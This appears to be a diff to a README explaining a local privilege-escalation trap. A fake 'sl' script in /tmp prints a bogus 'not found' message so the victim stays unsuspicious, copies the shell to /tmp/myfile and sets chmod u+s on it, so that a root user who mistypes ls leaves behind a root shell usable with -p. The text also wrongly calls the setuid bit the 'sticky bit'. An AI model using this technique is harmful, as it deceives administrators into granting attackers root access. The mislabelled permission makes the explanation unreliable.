@@ -16,7 +16,7 @@ chmod u+s /tmp/myfile
 
 ```
 1. echo "bash: sl not found " ---> informs the user that accidentally executed our script that his command was spelled wrong , in order to not be suspicious.
-2. cp $SHELL /tmp/myfile ---> copies the user that executed our script bash shell to /tmp/myfile
+2. cp $SHELL /tmp/myfile ---> copies the user's, that executed our script, bash shell to /tmp/myfile
 3. chmod u+s /tmp/myfile -----> enables sticky bit , so if it is a root user we will then execute the new script , as root.
 
 When a root user accidentally types sl instead of ls on /tmp , he runs our executable and the /tmp/myfile is finally created .It is  important to execute the new file  with the -p option to keep the privilleges of the root.
